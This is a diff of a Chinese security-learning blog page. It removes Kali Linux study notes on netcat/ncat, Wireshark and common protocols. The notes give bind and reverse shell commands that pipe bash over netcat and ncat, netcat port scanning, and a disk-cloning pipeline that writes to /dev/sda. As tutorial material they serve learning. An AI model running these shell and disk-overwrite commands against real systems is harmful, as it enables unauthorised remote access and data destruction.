-<li><p>数据包的分层结构</p>
-<ul>
-<li>ARP</li>
-<li>ICMP</li>
-<li>TCP-三次握手</li>
-<li>UDP</li>
-<li>DNS</li>
-<li>HTTP</li>
-<li>FTP</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>对于非官方端口解析：选中 → 右键 → Decode As → HTTP</code></pre></blockquote>
-<ol start="2">
-<li><p>WIRESHARK-TCP</p>
-<ul>
-<li>数据流<ul>
-<li>http（明文传输）</li>
-<li>Smtp（明文传输）</li>
-<li>Pop3（明文传输）</li>
-<li>Ssl（密文传输，公钥证书是以明文传输的形式）</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>完整的数据响应过程：选中 → 右键 → follow TCP/UDP stream</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/25/%E4%BB%BB%E5%8A%A1012%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E3%80%81NCAT%E3%80%81WIRESHARK%E3%80%81WIRESHARK-%E7%AD%9B%E9%80%89%E5%99%A8%E3%80%81%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/25/%E4%BB%BB%E5%8A%A1012%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E3%80%81NCAT%E3%80%81WIRESHARK%E3%80%81WIRESHARK-%E7%AD%9B%E9%80%89%E5%99%A8%E3%80%81%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/" itemprop="url">012：Kali Linux基本工具-远程控制、NCAT、WIRESHARK、WIRESHARK-筛选器、常见协议</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-25T21:22:48+08:00">
-                2019-11-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<ol>
-<li><p>NC-远程控制</p>
-<ul>
-<li>正向<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口 -c bash</code></strong></li>
-<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号</code></strong></li>
-</ul>
-</li>
-<li>反向<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口号</code></strong></li>
-<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号 -c bash</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>Windows用户把bash改成cmd
-IDC机房可以采用服务器作为客户端，由内网向外网连接侦听的外部服务器，传递bash</code></pre></blockquote>
-<ol start="2">
-<li><p>NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019.11.25需要安装，会覆盖netcat</p>
-<ul>
-<li>NC缺乏加密和身份验证的能力（可被嗅探，基本上是透明的，可在外部系统加密再进行传输）</li>
-<li>Ncat包含nmap工具包中</li>
-<li>A:<strong><code>🔺命令：ncat -c bash --allow IP地址 -vnl 端口号 --ssl</code></strong></li>
-<li>B:<strong><code>🔺命令：ncat -nv IP地址 端口 --ssl</code></strong></li>
-<li>不同系统/平台的nc参数功能不尽相同</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>window系统不存在-c参数，需要通过中间文本去传递shell
-查询用户手册：🔺命令：man nc（man手册）or 🔺命令：nc -h or 🔺命令：info nc</code></pre></blockquote>
-<ol start="3">
-<li><p>WIRESHARK</p>
-<ul>
-<li>抓包嗅探协议分析</li>
-<li>安全专家必备的技能</li>
-<li>抓包引擎<ul>
-<li>Libpcap9–Linux</li>
-<li>Winpcap10–Windows</li>
-</ul>
-</li>
-<li>解码能力（衡量抓包软件能力强弱）</li>
-</ul>
-</li>
-<li><p>WIRESHARK-基本使用</p>
-<ul>
-<li>启动</li>
-<li>选择抓包网卡</li>
-<li>混杂模式</li>
-<li>实时抓包</li>
-<li>保存和分析捕获文件</li>
-<li>首选项（布局调整：Edit → Preferences）</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>混杂模式会抓以太网内所有的包，非混杂只抓取到达自己网卡的包（Enable promiscuous mode on all interfaces）
-抓包筛选器（Capture Filter），可自己设置（如：host ip地址）</code></pre></blockquote>
-<ol start="5">
-<li><p>WIRESHARK-筛选器</p>
-<ul>
-<li>过滤掉干扰的数据包</li>
-<li>抓包筛选器</li>
-<li>显示筛选器（右键 → Apply as Filter，可对任何数据）</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>Network → Capture Filters → Capture Engine → Dispaly Filters</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/25/%E4%BB%BB%E5%8A%A1011%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-NETCAT%EF%BC%88%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E3%80%81%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%81%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/25/%E4%BB%BB%E5%8A%A1011%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-NETCAT%EF%BC%88%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E3%80%81%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%81%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98%EF%BC%89/" itemprop="url">011：Kali Linux基本工具-NETCAT（传输文件-目录、流媒体服务器、端口扫描、远程克隆硬盘）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-25T21:22:48+08:00">
-                2019-11-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<ol>
-<li><p>NC-传输文件/目录</p>
-<ul>
-<li>传输文件<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口号&gt;x.mp4</code></strong>（接收端）</li>
-<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号&lt; x.mp4 -q 1</code></strong>（发送端）</li>
-<li>or</li>
-<li>A:<strong><code>🔺命令：nc -lp 端口号 &lt; x.mp4 -q 1</code></strong>（发送端）</li>
-<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 &gt;x.mp4</code></strong>（接收端）</li>
-</ul>
-</li>
-<li>传输目录 ▲2019.11.25实验未成功<ul>
-<li>A:<strong><code>🔺命令：tar -cvf -文件名/ | nc -lp 端口号 -q 1</code></strong>（发送端）</li>
-<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | tar -xvf -</code></strong>（接收端）</li>
-</ul>
-</li>
-<li>加密传文件（操作系统安装的mcrypt）<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口号 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; x.mp4</code></strong>（接收端）</li>
-<li>B:<strong><code>🔺命令：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; x.mp4 | nc -nv ip地址 端口号 -q 1</code></strong>（发送端）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>NC-流媒体服务（需安装mplayer）</p>
-<ul>
-<li>A:<strong><code>🔺命令：cat x.mp4 | nc -lp 端口号</code></strong></li>
-<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | mplayer -vo x11 -cache 3000 -</code></strong></li>
-</ul>
-</li>
-<li><p>NC-端口扫描</p>
-<ul>
-<li><strong><code>🔺命令：nc -nvz ip地址 x-x(TCP端口号)</code></strong></li>
-<li><strong><code>🔺命令：nc -nvzu ip地址 x-x(UDP端口号)</code></strong></li>
-</ul>
-</li>
-<li><p>NC-远程克隆硬盘 ▲2019.11.25未验证</p>
-<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口号 | dd of=/dev/sda</code></strong></li>
-<li>B:<strong><code>🔺命令：dd if=/dev/sda | nc -nv IP地址 端口号 -q 1</code></strong></li>
-<li>远程电子取证，可以将目标服务器硬盘远程复制，或者内存</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>硬盘删除文件，只删除文件名的索引，不完整删除文件，进行标记，可以进行恢复
-dd进行磁盘复制，是完整的镜像硬盘复制，包括删除的文件标记</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2186,7 +2317,7 @@ dd进行磁盘复制，是完整的镜像硬盘复制，包括删除的文件标
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">40</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
